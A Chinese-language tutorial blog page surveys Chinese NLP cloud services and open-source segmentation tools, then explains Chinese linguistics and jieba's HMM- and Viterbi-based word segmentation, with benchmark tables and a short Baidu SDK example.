时隔半年之后我们再来看一下这个产品名录发现，功能更加丰富了。整体来看受限于语料的积累，我认为没有什么亮点。

2.2.3 腾讯云NLP


https://cloud.tencent.com/product/nlp
界面友好，功能丰富，语料库为海量综合性语料库
腾讯云智在线演示系统
http://nlp.qq.com/semantic.cgi
2.2.4 百度语言处理基础技术

http://ai.baidu.com/tech/nlp
依托海量检索数据，并且搜索引擎本身就是NLP 最终的结果产出，所以在NLP领域，百度无论是语料库丰富程度，技术先进性，以及服务多样性等都是遥遥领先其他厂家，基本上可以算作是中文NLP服务提供商的业界最佳实践。


功能丰富且技术领先

词法分析
词向量表示
词义相似度
评论观点抽取
文章标签
依存句法分析
DNN语言模型
短文本相似度
情感倾向分析
文章分类
对话情绪识别
文本纠错
新闻摘要



等13个大类的服务,对于个人开发者来说，配比了免费额度，对于词向量来说，每秒免费的额度是5个词，基本可以够用拿来做点有趣的事情了。
从图中结果也可以看出，百度对词向量相似度的分析和我用余弦相似度的结果一样，可以推断出百度的算法比较接地气。

DNN语言模型

Deep Neural Network（DNN）模型是基本的深度学习框架，DNN语言模型是通过计算给定词组成的句子的概率，从而判断所组成的句子是否符合客观语言表达习惯
通常用于机器翻译、拼写纠错、语音识别、问答系统、词性标注、句法分析和信息检索等
百度这个模型是大厂中首个公开提供服务接口的深度学习语言模型。

调用方式友好简单

提供更加简单的调用方式：类似aws boto3
如果已安装pip，执行pip install baidu-aip即可
Sdk 方式，安装
from aip import AipNlp
 """ 你的 APPID AK SK """ 
APP_ID = '你的 App ID' 
API_KEY = '你的 Api Key' 
SECRET_KEY = '你的 Secret Key' 
client = AipNlp(APP_ID, API_KEY, SECRET_KEY)

word = "张飞"
 """ 调用词向量表示 """ 
client.wordEmbedding(word);


2.3 NLP开源组件简介
NLP 领域有非常多的开源组件可以用来快速构建开发的原型，我来简单介绍以下四个知名开源组件
2.3.1 NLTK
http://www.nltk.org/

最常用的自然语言处理库
NLTK是一个高效的Python构建的平台，用来处理人类自然语言数据。基本包含了NLP 中需要用到的所有技术。
它提供了易于使用的接口，通过这些接口可以访问超过50个语料库和词汇资源（如WordNet），还有一套用于分类、标记化、词干标记、解析和语义推理的文本处理库，以及工业级NLP库的封装器和一个活跃的讨论论坛。
古腾堡项目（Project Gutenberg）
NLTK 包含古腾堡项目（Project Gutenberg）中电子文本档案的经过挑选的一小部分文本。该项目大约有57,000 本免费电子图书，放在http://www.gutenberg.org/上。我们先要用Python 解释器加载NLTK 包，然后尝试nltk.corpus.gutenberg.fileids()，当然其中的中文语料也很丰富（都是没有版权的免费文档），比如李白文集，三字经，百家姓等等（要是用这些训练中文模型效果可想而知）

2.3.2 Jieba分词
https://github.com/fxsjy/jieba
“结巴”中文分词：做最好的 Python 中文分词组件
“Jieba” (Chinese for “to stutter”) Chinese text segmentation: built to be the best Python Chinese word segmentation module.
实现基本功能的代码量在一千行左右，词典长度35w ，安装方式友好，简洁，高效，（但准确性已经跟不上时代！！！85%）
2.3.3 ICTCLAS
http://ictclas.nlpir.org/
主要功能包括中文分词；词性标注；中英混合分词；命名实体识别；用户词典功能；支持GBK编码、UTF8编码、BIG5编码。新增微博分词、新词发现与关键词提取；张华平博士先后倾力打造20余年，内核升级10次。
全球用户突破20万，先后获得了2010年钱伟长中文信息处理科学技术奖一等奖，2003年国际SIGHAN分词大赛综合第一名，2002年国内973评测综合第一名。
2.3.4 Gensim
https://radimrehurek.com/gensim/
它的 slogan 是：Topic modelling for humans.
Gensim提供了一个发现文档语义结构的工具，用于从原始的非结构化的文本中，无监督地学习到文本隐层的主题向量表达。它将语料（Corpus）向量化表示后，主要能够实现以下三个功能：

建立语言模型
词嵌入模型的训练
检索和语义分析的神器

简介参考：https://www.cnblogs.com/iloveai/p/gensim_tutorial.html

参考文献
我爱自然语言处理
http://www.52nlp.cn/
深度学习与中文短文本分析总结与梳理
https://blog.csdn.net/wangyaninglm/article/details/66477222
分析了近5万首《全唐诗》，发现了这些有趣的秘密
http://www.growthhk.cn/cgo/9542.html
万字干货｜10款数据分析“工具”，助你成为新媒体运营领域的“增长黑客”
http://www.woshipm.com/data-analysis/553180.html
jieba分词简介与解析
https://www.cnblogs.com/baiboy/p/jieba2.html
有哪些好的汉语分词方案
https://www.zhihu.com/question/19578687
基于分布式的短文本命题实体识别之----人名识别（python实现）
https://blog.csdn.net/wangyaninglm/article/details/75042151
NLP技术的应用及思考
https://yq.aliyun.com/articles/78031



了解本专栏

                    订阅专栏 解锁全文
                    









文章大纲0.内容梗概1. 基于传统统计算法的分词组件1.1 hanlp : Han Language Processing1.1.1 pyhanlp 安装1.1.2 功能及分词样例1.1.3 分词原理1.1.4 特点、性能、准确率1.2 语言技术平台（Language Technology Platform，LTP）1.2.1 LTP 安装1.2.2 功能及分词样例1.2.3 分词原理1.2.4 特点、性能、准确率1.3 汉语分词系统ICTCLAS 









文章大纲0.内容梗概分词评价标准混淆矩阵准确率、精确率、召回率、F1黄金标准其他评测准则BLEUROUGECalinski-Harabasz Index轮廓系数兰德系数参考文献
0.内容梗概
《自然语言处理实战入门》第三章 内容目录

中文分词原理及相关组件简介 之 ---- 汉语语言学


中文分词原理及相关组件简介 









文章大纲0.内容梗概分词算法介绍语言模型HMMCRF结构化感知器开源实现bi LSTM开源实现维特比算法汉语分词技术----以jieba 分词为例Jieba分词的特点分词算法未登录词识别与词性标注未登录词识别词性标注参考文献
 









文章大纲0.内容梗概3. NLP 云厂商3.1 百度语言处理基础技术简介特点 、服务范围调用样例3.2 PaddleNLP3.3 腾讯NLP简介特点、服务范围调用样例3.4 阿里 NLP简介特点、服务范围调用样例3.5 其他知名NLP 服务提供商boson 









文章大纲0.内容梗概2.深度学习分词2.1 jiagu 分词安装功能及分词样例分词原理特点、性能、准确率2.2 FoolNLTK安装功能及分词样例分词原理特点、性能、准确率2.3 deepnlp安装功能及分词样例分词原理特点、性能、准确率 









文章大纲0.内容梗概1. 汉语语言学简介1.1 汉语与汉字的起源1.2 汉字的统一与演变1.3 印欧语系与汉藏语系1.4 语言区别对于NLP 的影响2. 词汇与分词技术简介2.1 汉语词汇2.2 汉语分词的挑战2.3 汉语分词技术及其历史发展2.4 分词的重要性3. 思考： 我们真的还需要分词么？参考文献
0.内容梗概
《自然语言处理实战入门》第三章 内容目录

中文分词原理及相关组件简介 之 ----  









文章大纲1.python 开发简介1.1 python 集成开发环境1.1.1 pycharm1.1.2 spyder1.1.3 jupyter notebook1.1.4 jupyter lab1.1.5 Colaboratory1.2 python虚拟环境准备1.2.1 Anaconda1.2.2 虚拟环境与包管理1.2.3 conda1.2.4 conda基本环境配置1.2.5 jupyter notebook 中使用conda 的虚环境 









文章大纲简介python 字符串操作正则表达式的相关原理python 正则表达式应用举例常用正则表达式正则表达式在线测试工具参考文献
简介
一个正则表达式（或RE）指定了一集与之匹配的字符串；模块内的函数可以让你检查某个字符串是否跟给定的正则表达式匹配（或者一个正则表达式是否匹配到一个字符串，这两种说法含义相同）。
正则表达式是处理字符串的强大工具，拥有独特的语法和独立的处理引擎。
我们在大文本中匹配字符串时，有些情况用str自带的函数(比如find, in)可能可以完成，有些情况会稍稍复杂一些(比如说找出所有“格式类似邮箱”的字符串，所有和python相关的句子)，这个时候我们需要一个可根据模式提取字串的工具，这个时候正则表达式就派上用场了。
python 字符串操作
在 Python 中处理文本数据是使用 str 对象，也称为 字符串。 字符串是由 Unicode 码位构成的不可变 序列。 字符串字面值有多种不同的写法：


单引号: ’ 允许包含有 “双” 引号’

 









文章大纲1对象关系映射 ORM1.1 简介1.2  博客相关信息与对象映射2. 博客爬虫的编写2.1 爬虫爬取逻辑回顾2.2 爬取本人CSDN 博客 爬虫逻辑
1对象关系映射 ORM
1.1 简介
ORM框架的作用就是把数据库表的一行记录与一个对象互相做自动转换。
正确使用ORM的前提是了解关系数据库的原理。
SQLAlchemy is the Python SQL toolkit and Object Relational Mapper that gives application developers the full power and flexibility of SQL.
It provides a full suite of well known enterprise-level persistence patterns, designed for efficient and high-performing database access, adapted into a simple and Pythonic domain language.
https://www.sqlalchemy.org/
ORM的全称是:Object Relational Mapp 









我们平时做自然语言处理，机器学习，都是希望能够有丰富的训练数据集，这样才能获取质量上乘的模型。在大数据时代，处理数据已经不再是是问题了，spark，hadoop ，Elastic search提供了海量甚至巨量的分布式数据处理方法。问题是没有数据怎么办？在合理合法 的前提下自然语言处理 的语料和其他机器学习模型训练数据需要的图片等等各类数据，我们其实都是可以通过网络爬虫的方式进行积累的。
文章大纲1. 网络爬虫1.1 网络爬虫的合法性1.2 网络爬虫前置技术1.3 目标网站进行调研1.3.1 robots.txt1.3.2 网站所使用的技术1.3.3 网站地图1.3.4 估算网站大小1.3.5 网站所有者1.4 网络爬虫的通用流程1.5 爬取脚本样例参考文献
 









同步发表于：本人所属公司博客<知盛数据集团西安研发中心技术博客>
https://blog.csdn.net/Insightzen_xian/article/details/81168829
文章大纲1.Nlp技术体系简介1.1 基础技术1.2 Nlp 核心技术1.3 NlP+（高端技术）2.知名NLP 服务系统简介2.1汉语分词系统ICTCLAS2.2 哈工大语言云（Language Technology Platform，LTP）2.3 Amazon Comprehend2.4 阿里云NLP2.5 腾讯云NLP2.6 百度语言处理基础技术2.6.1 功能丰富且技术领先2.6.2 DNN语言模型2.6.3 调用方式简单2.7 准确率（离线模型靠不住，在线模型可更新）2.8 其他知名提供商3. NLP开源组件简介3.1 NLTK3.2 Jieba分词3.3 ICTCLAS3.4 Gensim4. 汉语语言学4.1 汉字的统一4.2 印欧语系与汉藏语系5. 词汇与分词技术简介5.1 汉语词汇5.2 汉语分词技术6.汉语分词技术----以jieba 分词为例6.1 Jieba分词的特点6.2 分词算法6.3 未登录词识别与词性标注6.3.1 未登录词识别6.3.2 词性标注参考文献


大家好，今天和大家分享一下，我在自然语言处理（Natural Language Processing，NLP）的一些学习经验和心得体会。
主要内容分为两大部分，第一部分对汉语自然处理的服务提供商及其服务内容做一个简单的梳理，让大家能够更好的了解目前的技术手段，技术现状。第二部分，从汉语语言学，到传统的汉语自然语言处理方法的基础，汉语分词，力求在微观上让大家对汉语自然语言处理有一个全方位的认识。
1.Nlp技术体系简介
NLP 是人工智能和语言学领域的交叉学科，用于分析、理解和生成自然语言，以方便人和计算机设备进行交流，以及人与人之间的交流
自然语言处理在广义上分为两大部分：

第一部分为自然语言理解，是指让计算机懂人类的语言。
第二部分为自然语言生成，是指把计算机数据转化为自然语言。

NLP 技术按照由浅入深可以分为三个层次，分别为：

基础技术
核心技术
NLP+


1.1 基础技术
这三个层次中，基础技术主要是对自然语言中的基本元素进行表示和分析，比如词汇，短语，句子。
词汇短语分析中，大家熟知的分词技术，就是为了解决如下问题，比如：我去北京大学玩，北京大学独立成词，而不是分成北京和大学。
句法语义分析：对于给定的句子，进行分词、词性标记、命名实体识别和链接、句法分析、语义角色识别和多义词消歧。
1.2 Nlp 核心技术
NLP 的核心技术是建立在基础技术之上的的技术产出，基础技术中如词法，句法的分析越准确，核心技术的产出才能越准确。核心技术主要包括以下几个方面：


信息抽取
从给定文本中抽取重要的信息，比如，时间、地点、人物、事件、原因、结果、数字、日期、货币、专有名词等等。通俗说来，就是要了解谁在什么时候、什么原因、对谁、做了什么事、有什	么结果。涉及到实体识别、时间抽取、因果关系抽取等关键技术。


文本挖掘（或者文本数据挖掘）
包括文本聚类、分类、信息抽取、摘要、情感分析以及对挖掘的信息和知识的可视化、交互式的表达界面。目前主流的技术都是基于统计机器学习的。


机器翻译
把输入的源语言文本通过自动翻译获得另外一种语言的文本。根据输入媒介不同，可以细分为文本翻译、语音翻译、手语翻译、图形翻译等。机器翻译从最早的基于规则的方法到二十年前的基于统计的方法，再到今天的基于神经网络（编码-解码）的方法，逐渐形成了一套比较严谨的方法体系。


信息检索
对大规模的文档进行索引。可简单对文档中的词汇，赋之以不同的权重来建立索引，也可利用（句法分析，信息抽取，文本发掘）来建立更加深层的索引。在查询的时候，对输入的查询表达式比如一个检索词或者一个句子进行分析，然后在索引里面查找匹配的候选文档，再根据一个排序机制把候选文档排序，最后输出排序得分最高的文档。


1.3 NlP+（高端技术）
能够真正影响我们生活的黑科技，能够通过图灵测试的机器问答系统，我们可以称之为NLP+


问答系统
对一个自然语言表达的问题，由问答系统给出一个精准的答案。需要对自然语言查询语句进行某种程度的语义分析，包括实体链接、关系识别，形成逻辑表达式，然后到知识库中查找可能的候选答案并通过一个排序机制找出最佳的答案。


对话系统
系统通过一系列的对话，跟用户进行聊天、回答、完成某一项任务。涉及到用户意图理解、通用聊天引擎、问答引擎、对话管理等技术。此外，为了体现上下文相关，要具备多轮对话能力。


AI助手
目前自然语言处理的前沿，已经与人类真假难辨
https://v.qq.com/x/page/w0648xqraxj.html


参考：
https://www.zhihu.com/question/19895141/answer/149475410

2.知名NLP 服务系统简介
以下我们通过一些知名中文NLP服务提供商，包括我们熟知的云服务提供商BAT ,aws，以及两家科研院所的系统简介，来介绍以及宏观认识NLP的各种技术手段和应用场景。
首先介绍的是两家NLP基础分析，准确率很高的科研院所 的产品，源自北理工和哈工大，之后我们介绍知名云服务提供商的产品。
2.1汉语分词系统ICTCLAS
主页：http://ictclas.nlpir.org/
在线演示系统：http://ictclas.nlpir.org/
Python版本：https://github.com/tsroten/pynlpir
（需要频繁更新key）
https://blog.csdn.net/sinat_26917383/article/details/77067515

对于****这篇新闻稿 的实体抽取结果
http://news.163.com/18/0715/14/DMOTHJEK000189FH.html
该系统为汉语自然语言处理领域顶尖大牛，北京理工大学张华平博士20年的专业技术积累，NShort 革命性分词算法的发明者。
主要功能包括中文分词；英文分词；中英文混合分词，词性标注；命名实体识别；新词识别；关键词提取；支持用户专业词典与微博分析。NLPIR系统支持多种编码、多种操作系统、多种开发语言与平台。
该平台的特点为：功能丰富，分词，语义，实体发现准确率高，近期发布了最新的2018版。
（与熟知的jieba，ltp，清华thulac）
2.2 哈工大语言云（Language Technology Platform，LTP）
https://www.ltp-cloud.com/
源自哈工大知名的分词插件ltp，准确率高
Python版本：https://github.com/HIT-SCIR/pyltp

语言技术平台（Language Technology Platform，LTP）是哈工大社会计算与信息检索研究中心历时十年开发的一整套中文语言处理系统。LTP制定了基于XML的语言处理结果表示，并在此基础上提供了一整套自底向上的丰富而且高效的中文语言处理模块（包括词法、句法、语义等6项中文处理核心技术），以及基于动态链接库（Dynamic Link Library, DLL）的应用程序接口、可视化工具，并且能够以网络服务（Web Service）的形式进行使用。
“语言云”
以哈工大社会计算与信息检索研究中心研发的 “语言技术平台（LTP）” 为基础，为用户提供高效精准的中文自然语言处理云服务。 使用 “语言云” 非常简单，只需要根据 API 参数构造 HTTP 请求即可在线获得分析结果，而无需下载 SDK 、无需购买高性能的机器，同时支持跨平台、跨语言编程等。 2014年11月，哈工大联合科大讯飞公司共同推出 “哈工大-讯飞语言云”，借鉴了讯飞在全国性大规模云计算服务方面的丰富经验，显著提升 “语言云” 对外服务的稳定性和吞吐量，为广大用户提供电信级稳定性和支持全国范围网络接入的语言云服务，有效支持包括中小企业在内开发者的商业应用需要。
有关更多语言云API的使用方法，请参考：http://www.ltp-cloud.com/document/
windows 下安装pyltp的话，应该是需要安装visual studio, 由于LTP是用c++写的，pyltp也是基于它封装而成的，需要调用 cl.exe 完成源码的编译。然后下载源码，使用python setup.py install 的方式进行安装就可以了。
2.3 Amazon Comprehend

https://amazonaws-china.com/cn/comprehend/?nc2=h_a1
Amazon Comprehend 是一项自然语言处理 (NLP) 服务，可利用机器学习发现文本中的见解和关系。Amazon Comprehend 可以识别文本语言，提取关键的短语、地点、人物、品牌或事件，了解文本的含义是肯定还是否定，还可以自动按主题整理一系列文本文件。
您可使用 Amazon Comprehend API 分析文本，并将结果进行广泛应用，包括客户意见分析、智能文档搜索以及 Web 应用程序的内容个性化设置。
该服务不断地通过各种信息来源 (包括世界上最大的自然语言数据集之一：Amazon.com 商品描述和买家评论) 学习和提升，	以跟上语言的发展演变。
实例：利用 AWS Comprehend 打造近实时文本情感分析
https://amazonaws-china.com/cn/blogs/china/realizing-near-real-time-text-sentiment-analysis-with-aws-comprehend/
可以看到图中，aws 使用kibana 仪表盘和 Comprehend 服务组成了一个实时的电影评论实时分析系统，其实主要功能就是实现了分词和内容来源的地理位置统计，看起来很炫酷。
2.4 阿里云NLP

https://data.aliyun.com/product/nlp?spm=5176.8142029.388261.396.63f36d3eoZ8kNK
阿里的简介为：
自然语言处理是为各类企业及开发者提供的用于文本分析及挖掘的核心工具，
已经广泛应用在电商、文化娱乐、金融、物流等行业客户的多项业务中。

自然语言处理API可帮助用户搭建内容搜索、内容推荐、舆情识别及分析、文本结构化、对话机器人等智能产品，
也能够通过合作，定制个性化的解决方案。

现在购买资源包，享受梯度优惠的同时，基础版API更有每天5万次免费调用额度。
值得注意的是阿里云的nlp 服务刚发布不到1年，应该算是领域内的新手，语料库应该和aws 一样，主要为商品描述和评论，所以它有一项功能叫做商品评价解析

2.5 腾讯云NLP

https://cloud.tencent.com/product/nlp
界面友好，功能丰富，语料库为海量综合性语料库
腾讯云智在线演示系统
http://nlp.qq.com/semantic.cgi
2.6 百度语言处理基础技术

http://ai.baidu.com/tech/nlp
依托海量检索数据，并且搜索引擎本身就是NLP 最终的结果产出，所以在NLP领域，百度无论是语料库丰富程度，技术先进性，以及服务多样性等都是遥遥领先其他厂家，基本上可以算作是中文NLP服务提供商的业界最佳实践。
2.6.1 功能丰富且技术领先
- 词法分析   
- 词向量表示 
- 词义相似度 
- 评论观点抽取
- 文章标签  
- 依存句法分析
- DNN语言模型
- 短文本相似度
- 情感倾向分析
- 文章分类
- 对话情绪识别
- 文本纠错

等12个大类的服务,对于个人开发者来说，配比了免费额度，对于词向量来说，每秒免费的额度是5个词，基本可以够用拿来做点有趣的事情了。
从图中结果也可以看出，百度对词向量相似度的分析和我用余弦相似度的结果一样，可以推断出百度的算法比较接地气。
2.6.2 DNN语言模型
Deep Neural Network（DNN）模型是基本的深度学习框架，DNN语言模型是通过计算给定词组成的句子的概率，从而判断所组成的句子是否符合客观语言表达习惯
通常用于机器翻译、拼写纠错、语音识别、问答系统、词性标注、句法分析和信息检索等
百度这个模型是大厂中首个公开提供服务接口的深度学习语言模型。
2.6.3 调用方式简单
提供更加简单的调用方式：类似aws boto3
如果已安装pip，执行pip install baidu-aip即可
Sdk 方式，安装
from aip import AipNlp
 """ 你的 APPID AK SK """ 
APP_ID = '你的 App ID' 
API_KEY = '你的 Api Key' 
SECRET_KEY = '你的 Secret Key' 
client = AipNlp(APP_ID, API_KEY, SECRET_KEY)

word = "张飞"
 """ 调用词向量表示 """ 
client.wordEmbedding(word);

2.7 准确率（离线模型靠不住，在线模型可更新）
THULAC实验室在统一测试环境下，对若干流行分词软件和THULAC进行了测试，使用的模型为各分词软件自带模型。THULAC使用的是随软件提供的简单模型Model_1。评测环境为 Intel Core i5 2.4 GHz 评测结果如下：
msr_test（560KB）



Algorithm
Time
Precision
Recall




LTP-3.2.0
3.21s
0.867
0.896


ICTCLAS(2015版)
0.55s
0.869
0.914


jieba
0.26s
0.814
0.809


THULAC
0.62s
0.877
0.899


pku_test（510KB）



Algorithm
Time
Precision
Recall




LTP-3.2.0
3.83s
0.960
0.947


ICTCLAS(2015版)
0.53s
0.939
0.944


jieba
0.23s
0.850
0.784


THULAC
0.51s
0.944
0.908


除了以上在标准测试集上的评测，我们也对各个分词工具在大数据上的速度进行了评测，结果如下：
CNKI_journal.txt（51 MB）



Algorithm
Time
Speed




LTP-3.2.0
348.624s
149.80KB/s


ICTCLAS(2015版)
106.461s
490.59KB/s


jieba
22.5583s
2314.89KB/s


THULAC
42.625s
1221.05KB/s


本文截取清华和部分网络评测，以及个人使用结果发现。最好使用的开源组件如python的jieba 分词准确度并不是很高，这是由于离线的模型很难在新词的发现上做出比较好的结果。由于云服务提供商的在线模型一般的更新频率 较快，所以准确度较高。
清华评测性能对比：
http://thulac.thunlp.org/
基于python 版本的评测：
https://blog.csdn.net/riario/article/details/78259877
2.8 其他知名提供商
BosonNLP(界面，接口友好，准确率高)
https://bosonnlp.com/demo

如果你在网上搜索汉语分词评测，十有八九你会搜索到专注于汉语自然语言处理技术的这家公司，以及下面这张评测结果：


3. NLP开源组件简介
NLP 领域有非常多的开源组件可以用来快速构建开发的原型，我来简单介绍以下四个知名开源组件
3.1 NLTK
http://www.nltk.org/

最常用的自然语言处理库
NLTK是一个高效的Python构建的平台，用来处理人类自然语言数据。基本包含了NLP 中需要用到的所有技术。
它提供了易于使用的接口，通过这些接口可以访问超过50个语料库和词汇资源（如WordNet），还有一套用于分类、标记化、词干标记、解析和语义推理的文本处理库，以及工业级NLP库的封装器和一个活跃的讨论论坛。
古腾堡项目（Project Gutenberg）
NLTK 包含古腾堡项目（Project Gutenberg）中电子文本档案的经过挑选的一小部分文本。该项目大约有57,000 本免费电子图书，放在http://www.gutenberg.org/上。我们先要用Python 解释器加载NLTK 包，然后尝试nltk.corpus.gutenberg.fileids()，当然其中的中文语料也很丰富（都是没有版权的免费文档），比如李白文集，三字经，百家姓等等（要是用这些训练中文模型效果可想而知）

3.2 Jieba分词
https://github.com/fxsjy/jieba
“结巴”中文分词：做最好的 Python 中文分词组件
“Jieba” (Chinese for “to stutter”) Chinese text segmentation: built to be the best Python Chinese word segmentation module.
实现基本功能的代码量在一千行左右，词典长度35w ，安装方式友好，简洁，高效，（但准确性已经跟不上时代！！！85%）
3.3 ICTCLAS
http://ictclas.nlpir.org/
主要功能包括中文分词；词性标注；中英混合分词；命名实体识别；用户词典功能；支持GBK编码、UTF8编码、BIG5编码。新增微博分词、新词发现与关键词提取；张华平博士先后倾力打造20余年，内核升级10次。
全球用户突破20万，先后获得了2010年钱伟长中文信息处理科学技术奖一等奖，2003年国际SIGHAN分词大赛综合第一名，2002年国内973评测综合第一名。
3.4 Gensim
https://radimrehurek.com/gensim/
它的 slogan 是：Topic modelling for humans.
Gensim提供了一个发现文档语义结构的工具，用于从原始的非结构化的文本中，无监督地学习到文本隐层的主题向量表达。它将语料（Corpus）向量化表示后，主要能够实现以下三个功能：

建立语言模型
词嵌入模型的训练
检索和语义分析的神器

简介参考：https://www.cnblogs.com/iloveai/p/gensim_tutorial.html

4. 汉语语言学

下面我们进入第二个部分的介绍，汉语语言学与汉语分词技术。
汉语，即汉族的语言，是中国通用语言，国际通用语言之一，属汉藏语系,汉语历史悠久，使用人数最多，世界上使用汉语的人数至少15亿 ，超过世界总人口的20%
汉字最早起源于商朝的甲骨文，距今已经有3000-4000年的历史了。文字的目的是为了记录，古汉语以独字为核心，即使隋唐以后汉语书面语逐渐向口语化发展，从甲骨文出现至今的4000年中，汉语基本的语法格局和造字方法始终没有本质变化。
4.1 汉字的统一
秦朝李斯受命统一文字，图中这种文字就是小篆。通行于秦代。形体偏长，匀圆齐整，由大篆衍变而成。小篆也叫“秦篆”。东汉许慎《说文解字·叙》 称：“秦始皇帝初兼天下……罢其不与秦文合者。”李斯作《仓颉篇》，中车府令赵高作《爰历篇》，太史令胡毋敬作《博学篇》，“皆取史籀大篆，或颇省改，所谓小篆者也。”今存《琅琊台刻石》、 《泰山刻石》残石，即小篆代表作。
汉字统一后，我们的祖先通过造字并且成词，成句，最终留下了浩如烟海的璀璨文化。
值得一提的是，对于计算机可以理解的语料库，知识库，我国起步很晚。
1979年开始，中国开始机器可读的语料库的建设，至1991年开始建设国家级的语料库。现在我们使用汉语分词开源组件的大部分语料库都是基于《人民日报》加工的，一般项目包括词语切分、词性标注、专有名词（专有名词短语）标注。还要对多音词注音。
4.2 印欧语系与汉藏语系
从古至今，汉语的表达基本单位是字，造字的方法六书：
象形，指事，会意，转注，假借，形声

汉语中每个字都有非常丰富的含义。比如图片中的会意字，顺字，就在字本身上表达出了，柔顺通顺的含义。
当然印欧语系与汉语的诸多不同中，有如下两点是至关重要的。

第一，印欧语系都实行分词连写，词与词之间用空格分割，因此没有分词问题。
第二，印欧语种大多数都通过形态变化构造语法结构，有很强 的规范性。

基于印欧语系这些特点，在自然语言诞生的初期阶段，句法分析已经成为西方NLP的核心主题
在汉语自然语言处理的过程中，遇到的问题与印欧语言有诸多不同：首先中文分词就是西方语言所不曾遇到的问题
在句法解析环节，如果照搬西方语言的算法理论，越来越多 的事实证明，句法分析的在汉语上的精度要显著低于西方语言。

5. 词汇与分词技术简介
汉语词汇是汉语语言中能够独立运用的最小语言单位，是语言中的原子结构。独立运用意味着，单独做句法成分或单独起语法作用。
因此对中文进行分词就显的至关重要。汉字有5-20万多个，但是常用的汉字仅有6000个，在线新华字典中收录了约52万个汉语词汇。
在英文的行文中，单词之间是以空格作为自然分界符的，而中文只是字、句和段能通过明显的分界符来简单划界，唯独词没有一个形式上的分界符，虽然英文也同样存在短语的划分问题，不过在词这一层上，中文比之英文要复杂得多、困难得多。（比如北京大学的划分，是单独成词还是两个词，这样的中文词汇还有很多）
5.1 汉语词汇
说到汉语词汇，汉语词汇有三个重要特性：
1.稳固性
2.常用性
3.能产性
前两个特性很好理解，能产性说的是，人们给小孩子起名就是词汇能产性的生动体现，汉语的构词机制是一个动态的自组织认知系统，所以汉语自然语言处理的魅力就在于，对于此类在社会发展过程中出现的新词，人名，组织机构名，如何正确切分并且识别。
5.2 汉语分词技术
由于国际上常用的NLP算法，深层次的语法语义分析通常都是以词作为基本单位，很多中文的自然语言处理的任务，也就多了一个预处理的过程来把连续的汉字分隔成更具有语言语义学上意义的词。这个过程就叫做分词。
简要来说分词就是：把没有明显分界标志的字串切分为词串
中文分词研究经历20于年，主要分化为三个流派。
1.机械式分词法（基于词典）
2.基于语法和规则的分词法
3.基于统计的分词法
最终较为成功的实现了中文词汇的自动切分技术（最近兴起的深度学习技术，又提供了新的分词思路）
尽管在语言学语义学上，词有着相对清晰的定义，对于计算机处理自然语言来说，分词很多时候没有放之四海皆准的共同标准。由于分词本身更多的时候是作为一个预处理的过程，判断其质量的好坏更多的时候需要结合下游的应用来进行。
分词问题为中文文本处理的基础性工作,分词效果的好坏对后面的中文信息处理其关键作用
参考：
深入NLP———看中文分词如何影响你的生活点滴
https://baike.baidu.com/tashuo/browse/content?id=d276fc8ff138ce5c74e7683b&lemmaId=&fromLemmaModule=pcBottom
6.汉语分词技术----以jieba 分词为例

以我认为使用起来最友好的jieba 分词为例，我们来认识一下基于统计类算法的汉语分词流程。
图片中例子参考：http://www.cnblogs.com/zhbzz2007/p/6076246.html
6.1 Jieba分词的特点
结巴分词安装好即可使用，自带一个35w 的语料库，其中标注了汉语常见词汇的词频，和词性。
概况来说，结巴分词主要有以下三个特点。
1.基于前缀词典实现高效的词图扫描，生成句子中汉字所有可能成词情况所构成的有向无环图 (DAG)
2.采用了动态规划查找最大概率路径, 找出基于词频的最大切分组合
3.对于未登录词，采用了基于汉字成词能力的 HMM 模型，使用了 Viterbi 算法
6.2 分词算法
jieba 分词算法的主要流程为三步
0.首先加载词库，完成初试环境设置
1.对于给定待分词的句子, 使用正则获取匹配的中文字符(和英文字符)切分成的短语列表（在语料库中）；
即，对指定的词库dict.txt进行计算生成前缀词典，到jieba进程的初始化工作完成后就调用get_DAG获得句子的DAG（有向无环图）；
2.根据句子的DAG则使用DAG(查字典)和动态规划, 得到最大概率路径, 对DAG中那些没有在字典中查到的字, 组合成一个新的片段短语, 使用HMM模型进行分词, 也就是识别新词, 即识别字典外的新词
6.3 未登录词识别与词性标注
6.3.1 未登录词识别
如果没有前缀词典或者有些词不在前缀词典中，则可以利用HMM模型进行分词，主要是将分词问题视为一个序列标注（sequence labeling）问题，其中，句子为观测序列，分词结果为状态序列。首先通过语料训练出HMM相关的模型，然后利用Viterbi算法进行求解，最终得到最优的状态序列，然后再根据状态序列，输出分词结果。
HMM（Hidden Markov Model） 隐马尔可夫模型，一种简单的网络图模型，同时是一种产生式模型是为了弄清楚并模拟数据产生的原理和机制。
HMM模型+viterbi算法（高通公司的联合创始人发明）进行分词的主要思想就是：
给定训练好的模型(如HMM)参数(λ=(A,B,π)), 然后对模型进行载入，再运行一遍Viterbi算法，就可以找出每个字对应的状态（B, M, E, S），这样就可以根据状态也就可以对句子进行分词。
4-tag，也就是每个字处在词语中的4种可能状态：
B、M、E、S，分别表示

- Begin（这个字处于词的开始位置）
- Middle（这个字处于词的中间位置）
- End（这个字处于词的结束位置）
- Single（这个字是单字成词）

基本规则
B后面只能接（M或者E），不可能接（B或者S）；而M后面也只能接（M或者E），不可能接（B或者S）
具体如下图所示，“去”和“玩”都是单字成词，因此状态就是S，“北京大学”是多字组合成的词，因此“北”、“京”、“大”、“学”分别位于“北京大学”中的B、M、M、E。
序列标注，就是将输入句子和分词结果当作两个序列，句子为观测序列，分词结果为状态序列，当完成状态序列的标注，也就得到了分词结果。实际上词性标注问题是一个解码问题。
由Viterbi算法得到状态序列（包含分词及词性标注），也就可以根据状态序列得到分词结果。其中状态以B开头，离它最近的以E结尾的一个子状态序列或者单独为S的子状态序列，就是一个分词。以”去北京大玩学城“为例，其中，“去“和”北京”在前缀词典中有，因此直接通过词–词性词典对其匹配即可，它俩的词性分别为“去/v”，“北京/ns”；而对于”大玩学城“这个句子，是未登录词，因此对其利用隐马尔科夫模型对其进行词性标志，它的隐藏状态序列就是[(u’S’, u’a’), (u’B’, u’n’), (u’E’, u’n’), (u’B’, u’n’)]这个列表，列表中的每个元素为一个元组，则分词为”S / BE / B“，对应观测序列，也就是”大 / 玩学 / 城”。
参考：https://www.cnblogs.com/baiboy/p/jieba2.html
6.3.2 词性标注


词性标注和未登录词的发现方法一样，都可以使用HMM模型来解决这样的问题。
给定词串W=w1w2…wn，和词性标记集，求对应的词性标记串T=t1t2…tn。
因为有些词有多个词性，所以从概率的角度看就是：给定W的条件下，求使得概率P（T|W）最高的那个词性标注串，即：

